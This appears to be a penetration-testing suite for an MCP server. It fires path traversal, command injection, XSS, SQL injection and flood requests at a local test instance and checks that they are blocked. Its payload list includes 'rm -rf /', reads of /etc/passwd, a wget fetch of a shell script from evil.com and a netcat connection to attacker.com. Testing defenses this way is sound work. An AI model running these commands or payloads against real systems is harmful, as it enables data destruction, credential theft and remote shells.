#!/usr/bin/env node

/**
 * @fileoverview Comprehensive MCP Security Penetration Testing Suite
 * Tests all security controls under realistic attack scenarios
 */

import { describe, test, before, after } from 'node:test';
import assert from 'node:assert';
import { createMcpServer } from './packages/mcp/dist/core/mcp-server.js';
import { fastifyTransport } from '../packages/mcp/dist/core/transports/fastify.js';
import { createSecurityMiddleware } from '../packages/mcp/dist/security/index.js';

// Security test configuration
const SECURITY_TEST_CONFIG = {
  port: 3001,
  host: '127.0.0.1',
  timeout: 5000,
};

// Attack payloads for testing
const ATTACK_PAYLOADS = {
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    '‥/‥/‥/etc/passwd', // Unicode homograph
    '﹒/﹒/﹒/etc/passwd', // Unicode fullwidth
    '..%2f..%2f..%2fetc%2fpasswd',
    '..\\..\\..\\etc\\passwd',
    '....\\\\....\\\\....\\\\etc\\\\passwd',
  ],
  commandInjection: [
    '; rm -rf /',
    '| cat /etc/passwd',
    '&& curl malicious.com',
    '`whoami`',
    '$(id)',
    '> /tmp/malicious',
    '; wget http://evil.com/shell.sh',
    '| nc attacker.com 4444',
    '`python -c "import os; os.system(\'rm -rf /\')"`',
  ],
  xss: [
    '<script>alert("XSS")</script>',
    'javascript:alert("XSS")',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
  ],
  sqlInjection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
    "' UNION SELECT * FROM passwords --",
  ],
  dos: [
    { type: 'large_request', data: 'A'.repeat(10 * 1024 * 1024) }, // 10MB
    { type: 'rate_limit', count: 2000 }, // Exceed rate limit
    { type: 'timeout', delay: 30000 }, // Long timeout
  ],
};

let server;
let securityMiddleware;
let baseUrl;

describe('MCP Security Penetration Tests', () => {
  before(async () => {
    console.log('🚀 Starting MCP Security Penetration Test Suite');

    // Initialize security middleware with test configuration
    securityMiddleware = createSecurityMiddleware({
      enableSecurityHeaders: true,
      enableAuditLog: true,
      allowedOrigins: ['*'],
      rateLimitMaxRequests: 100, // Lower for testing
      rateLimitWindowMs: 60 * 1000, // 1 minute for testing
      maxRequestSizeBytes: 1024 * 1024, // 1MB for testing
    });

    // Create test tools
    const testTools = [
      {
        spec: {
          name: 'files_view_file',
          description: 'Test file viewing tool',
          inputSchema: {
            type: 'object',
            properties: {
              relOrFuzzy: { type: 'string' },
            },
          },
        },
        invoke: async (args) => ({ result: 'file content', ...args }),
      },
      {
        spec: {
          name: 'exec_run',
          description: 'Test execution tool',
          inputSchema: {
            type: 'object',
            properties: {
              commandId: { type: 'string' },
              args: { type: 'array', items: { type: 'string' } },
            },
          },
        },
        invoke: async (args) => ({ result: 'executed', ...args }),
      },
    ];

    const mcpServer = createMcpServer(testTools);

    // Start Fastify server with security
    const transport = fastifyTransport(
      {
        '/mcp': mcpServer,
      },
      {
        port: SECURITY_TEST_CONFIG.port,
        host: SECURITY_TEST_CONFIG.host,
      },
    );

    server = await transport.start();
    baseUrl = `http://${SECURITY_TEST_CONFIG.host}:${SECURITY_TEST_CONFIG.port}`;

    console.log(`🌐 Test server started at ${baseUrl}`);
  });

  after(async () => {
    if (server) {
      await server.stop();
      console.log('🛑 Test server stopped');
    }
    if (securityMiddleware) {
      securityMiddleware.destroy();
    }
  });

  describe('Path Traversal Attack Tests', () => {
    test('should block basic path traversal attempts', async () => {
      for (const payload of ATTACK_PAYLOADS.pathTraversal) {
        const response = await fetch(`${baseUrl}/mcp`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0',
            id: 1,
            method: 'tools/call',
            params: {
              name: 'files_view_file',
              arguments: { relOrFuzzy: payload },
            },
          }),
        });

        const result = await response.json();

        // Should either succeed with sanitized path or fail with security error
        if (response.ok) {
          assert(result.result?.path, 'Should have sanitized path result');
          assert(!result.result.path.includes('..'), 'Path should be sanitized');
          assert(!result.result.path.includes('etc/passwd'), 'Should not access system files');
        } else {
          assert(result.error?.message, 'Should have security error message');
        }
      }
    });
  });

  describe('Command Injection Attack Tests', () => {
    test('should block command injection attempts', async () => {
      for (const payload of ATTACK_PAYLOADS.commandInjection) {
        const response = await fetch(`${baseUrl}/mcp`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0',
            id: 1,
            method: 'tools/call',
            params: {
              name: 'exec_run',
              arguments: {
                commandId: 'test.command',
                args: [payload],
              },
            },
          }),
        });

        const result = await response.json();

        // Should block malicious commands
        if (response.ok) {
          assert(!result.result?.stdout?.includes('passwd'), 'Should not read system files');
          assert(!result.result?.stdout?.includes('whoami'), 'Should not execute system commands');
        } else {
          assert(result.error?.message, 'Should have security error message');
        }
      }
    });
  });

  describe('XSS Attack Tests', () => {
    test('should sanitize XSS attempts', async () => {
      for (const payload of ATTACK_PAYLOADS.xss) {
        const response = await fetch(`${baseUrl}/mcp`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            jsonrpc: '2.0',
            id: 1,
            method: 'tools/call',
            params: {
              name: 'files_view_file',
              arguments: { relOrFuzzy: payload },
            },
          }),
        });

        const result = await response.json();

        // Check security headers are present
        assert(response.headers.get('x-content-type-options') === 'nosniff');
        assert(response.headers.get('x-frame-options') === 'DENY');
        assert(response.headers.get('content-security-policy'));
      }
    });
  });

  describe('Rate Limiting Tests', () => {
    test('should enforce rate limits', async () => {
      const promises = [];

      // Send rapid requests
      for (let i = 0; i < 150; i++) {
        promises.push(
          fetch(`${baseUrl}/mcp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              jsonrpc: '2.0',
              id: i,
              method: 'tools/call',
              params: {
                name: 'files_view_file',
                arguments: { relOrFuzzy: 'test.txt' },
              },
            }),
          }),
        );
      }

      const results = await Promise.allSettled(promises);
      const rejected = results.filter((r) => r.status === 'rejected' || !r.value.ok);

      // Should reject some requests due to rate limiting
      assert(rejected.length > 0, 'Should rate limit some requests');

      // Check for rate limit headers
      const sampleResponse = results.find((r) => r.status === 'fulfilled' && r.value.ok);
      if (sampleResponse) {
        const headers = sampleResponse.value.headers;
        assert(headers.get('x-ratelimit-limit'), 'Should have rate limit headers');
        assert(headers.get('x-ratelimit-remaining'), 'Should have remaining requests header');
      }
    });
  });

  describe('Request Size Limit Tests', () => {
    test('should block oversized requests', async () => {
      const largePayload = ATTACK_PAYLOADS.dos.find((p) => p.type === 'large_request');

      const response = await fetch(`${baseUrl}/mcp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'files_write_content',
            arguments: {
              filePath: 'large.txt',
              content: largePayload.data,
            },
          },
        }),
      });

      // Should reject large requests
      assert(response.status === 413, 'Should reject oversized requests');
    });
  });

  describe('Security Headers Tests', () => {
    test('should include all security headers', async () => {
      const response = await fetch(`${baseUrl}/mcp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'files_view_file',
            arguments: { relOrFuzzy: 'test.txt' },
          },
        }),
      });

      const headers = response.headers;

      // Verify all security headers are present
      assert(headers.get('x-content-type-options') === 'nosniff', 'Missing X-Content-Type-Options');
      assert(headers.get('x-frame-options') === 'DENY', 'Missing X-Frame-Options');
      assert(headers.get('x-xss-protection') === '1; mode=block', 'Missing XSS Protection');
      assert(headers.get('referrer-policy'), 'Missing Referrer-Policy');
      assert(headers.get('permissions-policy'), 'Missing Permissions-Policy');
      assert(headers.get('content-security-policy'), 'Missing CSP');
      assert(headers.get('strict-transport-security'), 'Missing HSTS');
    });
  });

  describe('Audit Logging Tests', () => {
    test('should log security events', async () => {
      // Trigger a security violation
      await fetch(`${baseUrl}/mcp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: {
            name: 'files_view_file',
            arguments: { relOrFuzzy: '../../../etc/passwd' },
          },
        }),
      });

      // Check audit log (if accessible via admin endpoint)
      const auditResponse = await fetch(`${baseUrl}/admin/audit-log`);
      if (auditResponse.ok) {
        const auditLog = await auditResponse.json();
        const securityEvents = auditLog.filter((entry) => entry.blocked || entry.violations);
        assert(securityEvents.length > 0, 'Should log security violations');
      }
    });
  });

  describe('CORS Security Tests', () => {
    test('should handle CORS securely', async () => {
      const response = await fetch(`${baseUrl}/mcp`, {
        method: 'OPTIONS',
        headers: {
          Origin: 'https://malicious.com',
          'Access-Control-Request-Method': 'POST',
          'Access-Control-Request-Headers': 'Content-Type',
        },
      });

      // Should not allow arbitrary origins in production
      const corsHeader = response.headers.get('access-control-allow-origin');
      if (corsHeader && corsHeader !== '*') {
        assert(
          corsHeader === 'https://malicious.com' || corsHeader === 'null',
          'Should restrict CORS origins',
        );
      }
    });
  });
});

// Run the tests
console.log('🛡️  Starting MCP Security Penetration Tests...');
console.log('📊 Testing will validate:');
console.log('   ✅ Path traversal protection');
console.log('   ✅ Command injection prevention');
console.log('   ✅ XSS protection');
console.log('   ✅ Rate limiting');
console.log('   ✅ Request size limits');
console.log('   ✅ Security headers');
console.log('   ✅ Audit logging');
console.log('   ✅ CORS security');
console.log('');

export default ATTACK_PAYLOADS;
